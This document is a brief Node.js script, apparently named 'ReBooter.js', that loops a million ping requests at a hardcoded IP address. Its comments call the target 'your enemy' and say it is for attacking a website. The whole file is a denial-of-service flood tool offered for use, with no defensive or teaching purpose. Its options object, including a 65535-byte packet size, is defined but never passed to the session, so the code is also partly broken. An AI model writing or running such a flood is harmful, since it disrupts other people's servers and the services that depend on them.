var ping = require ("net-ping");

// Set target to IP address of your enemy.
var target = "188.166.206.247";

//Options, if you are experienced you may edit it. Otherwise don't, you'll be fine.
var options = {
    networkProtocol: ping.NetworkProtocol.IPv4,
    packetSize: 65535,
    retries: 1,
    sessionId: (process.pid % 65535),
    timeout: 10000,
    ttl: 128
};

console.log("\nDon't forget that to attack a website you need to edit the target IP address in the ReBooter.js file!\n");

var session = ping.createSession ();

// Set i to how many times you want to send a packet to your enemy.
var i = 1000000;
while(i > 0){
	session.pingHost (target, function (error, target) {
		if (error)
			console.log (target + ": " + error.toString ());
		else
			console.log (target + ": Alive");
	});
	i--;
}